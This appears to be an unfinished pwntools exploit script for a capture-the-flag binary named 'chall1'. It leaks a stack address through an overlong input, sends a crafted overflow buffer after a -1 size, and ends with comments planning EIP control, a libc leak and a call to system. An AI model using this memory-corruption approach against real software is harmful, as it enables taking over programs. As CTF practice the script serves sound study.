from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')

# p = process('./chall1')
p = gdb.debug('chall1', 'b *0x08048b50')

def leak_stack(p):
    p.sendline(b'1')
    p.sendline(b'1'*0x41)
    p.recvuntil('resp:')
    stack_addr = u32(p.recvline()[-5:-1])
    stack_addr &= 0xffffff00
    log.info('stack is at {}'.format(hex(stack_addr)))
    p.sendline(b'y')
    return stack_addr

stack_addr = leak_stack(p)

buf = b''
buf += b'b'*4 + b'\x00'
buf += b'a'*(0x40-len(buf))
buf += b'\x00' # eip?
# buf += b'1'*4 + b'2'*4 + p32(0x8052040)
buf += cyclic(0x60).encode()

input()
p.sendline(b'-1')
p.send(buf+b'\r')
p.recvuntil('resp:')
log.info(p.recvline())

# make malloc fail with -1 size
# overwrite 3rd from 0 on the stack (find out why) to get EIP control
# leak libc by write call (find gadgets)
# call system
